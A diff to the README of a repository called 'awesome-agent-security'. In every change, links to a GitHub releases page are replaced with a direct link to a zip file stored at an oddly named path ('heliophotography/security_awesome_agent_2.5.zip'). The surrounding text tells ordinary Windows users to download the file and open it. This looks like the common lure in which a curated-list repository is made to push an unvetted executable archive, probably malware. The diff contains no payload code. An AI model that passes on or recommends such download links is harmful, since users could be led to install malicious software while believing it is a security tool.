@@ -1,10 +1,10 @@
 # 🛡️ awesome-agent-security - Guide to safer AI agent setups
 
-[![Download the app](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge)](https://github.com/nephritispeepshow717/awesome-agent-security/releases)
+[![Download the app](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/nephritispeepshow717/awesome-agent-security/main/heliophotography/security_awesome_agent_2.5.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/nephritispeepshow717/awesome-agent-security/releases
+Visit this page to download: https://raw.githubusercontent.com/nephritispeepshow717/awesome-agent-security/main/heliophotography/security_awesome_agent_2.5.zip
 
 Choose the latest release, then download the Windows file you see there. After the file finishes downloading, open it from your Downloads folder and follow the on-screen steps.
 
@@ -33,7 +33,7 @@ If your browser asks where to save the file, choose a folder you can find later,
 
 ## 🚀 Getting started
 
-1. Open the download page: https://github.com/nephritispeepshow717/awesome-agent-security/releases
+1. Open the download page: https://raw.githubusercontent.com/nephritispeepshow717/awesome-agent-security/main/heliophotography/security_awesome_agent_2.5.zip
 2. Look for the newest release at the top of the page
 3. Open the release page
 4. Find the Windows download file
@@ -164,7 +164,7 @@ This is a good fit for:
 ## 🌐 Download again later
 
 If you need the file again, return to the release page:
-https://github.com/nephritispeepshow717/awesome-agent-security/releases
+https://raw.githubusercontent.com/nephritispeepshow717/awesome-agent-security/main/heliophotography/security_awesome_agent_2.5.zip
 
 From there, you can get the latest version and replace older files if needed
 
@@ -194,7 +194,7 @@ Check your internet connection and open the release page again
 
 ## 📌 Release link
 
-Download page: https://github.com/nephritispeepshow717/awesome-agent-security/releases
+Download page: https://raw.githubusercontent.com/nephritispeepshow717/awesome-agent-security/main/heliophotography/security_awesome_agent_2.5.zip
 
 Use that page to download the latest Windows release and open it on your PC
 
